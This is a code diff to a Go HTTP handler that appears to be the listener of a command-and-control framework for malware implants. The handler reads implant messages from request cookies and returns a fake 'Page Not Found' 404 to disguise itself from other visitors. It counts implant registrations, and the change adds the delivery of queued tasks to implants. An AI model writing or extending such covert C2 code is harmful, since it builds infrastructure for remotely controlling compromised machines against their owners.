@@ -8,28 +8,33 @@ import (
 )
 
 func (l *Listener)root(w http.ResponseWriter, r *http.Request) {
-	a := processPayload(r)
+	a,task := processPayload(r)
 	
-	if a == implant.NIL {
+	if uint16(a) == implant.NIL {
 		w.WriteHeader(404)
 		w.Write([]byte("Page Not Found"))
 		return
-	} else if a == implant.REG {
+	} else if uint16(a) == implant.REG {
 		l.Association = l.Association + 1
 	}
 
 	w.WriteHeader(200)
+
+	if len(task) >= 8 {
+		w.Write(task)
+		return
+	}
 	w.Write([]byte("Hi!"))
 }
 
 
-func processPayload(r *http.Request) int {
+func processPayload(r *http.Request) (uint16, []byte) {
 	var stringReadCloser io.ReadCloser
 	
 	if r.Method == "GET" {
 		cookies := r.Cookies()
 		if len(cookies) == 0 {
-			return implant.NIL
+			return implant.NIL, []byte{}
 		} else {
 			stringReader := strings.NewReader(cookies[0].Value)
 			stringReadCloser = io.NopCloser(stringReader)
